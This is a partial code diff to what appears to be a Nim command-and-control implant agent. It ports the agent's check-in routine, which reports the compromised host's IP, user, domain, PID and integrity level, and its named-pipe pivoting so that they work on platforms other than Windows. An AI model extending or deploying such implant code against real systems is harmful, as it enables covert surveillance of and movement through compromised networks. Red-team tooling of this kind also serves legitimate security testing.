@@ -6,11 +6,15 @@ import random
 import strutils
 import std/tables
 import std/deques
-import winim/lean
 import std/options
 import taskQueue
 import socks/socks
-import pivot/pivot
+
+when defined(windows):
+  import pivot/pivot
+
+when defined(windows):
+  import winim/lean
 
 import config
 
@@ -49,15 +53,23 @@ proc sleepAgent*() =
 ]#
 proc checkIn*(): bool =
 
+  var osName = "Linux"
+  when defined(windows):
+    osName = "Windows"
+  elif defined(macosx):
+    osName = "macOS"
+
   let checkInData = %* AgentCheckInData(
     action: "checkin",
     ip: getLocalIP(),
-    os: "Windows 10",
+    os: osName,
     user: getUser(),
     host: getHost(),
     pid: getPID(),
     uuid: agent.uuid,
-    architecture: getArchitecture(GetCurrentProcess()),
+    architecture: getArchitecture(
+      when defined(windows): GetCurrentProcess() else: nil
+    ),
     process_name: getProcessName(),
     domain: getDomain(),
     integrity_level: getIntegrityLevel(0)
@@ -256,19 +268,23 @@ proc processSocks*() =
   privot connections and sends/requests the required data via the 'delegate' msg
 ]#
 proc processPivot*() =
+  when not defined(windows):
+    return
 
-  # loop all pivot edges and go through the
-  # connected named pipes and read the data
-  for edge in pivot.activePivots.edges:
-    # if the pipeHandle is an invalid handle
-    # continue with the next one
-    if edge.metadata.pipeHandle  == INVALID_HANDLE_VALUE:
-      continue
+  else:
 
-    DBG("Reading from pipe:")
-    var output = readPipe(edge.metadata.pipeHandle)
+    # loop all pivot edges and go through the
+    # connected named pipes and read the data
+    for edge in pivot.activePivots.edges:
+      # if the pipeHandle is an invalid handle
+      # continue with the next one
+      if edge.metadata.pipeHandle  == INVALID_HANDLE_VALUE:
+        continue
 
-    if len(output) >= 1:
-      # add the delegate message
-      var tmpDelMsg = DelegateMsg(message: output, uuid:edge.destination, c2_profile: edge.c2_profile)
-      delegateMessages.add(tmpDelMsg)
+      DBG("Reading from pipe:")
+      var output = readPipe(edge.metadata.pipeHandle)
+
+      if len(output) >= 1:
+        # add the delegate message
+        var tmpDelMsg = DelegateMsg(message: output, uuid:edge.destination, c2_profile: edge.c2_profile)
+        delegateMessages.add(tmpDelMsg)
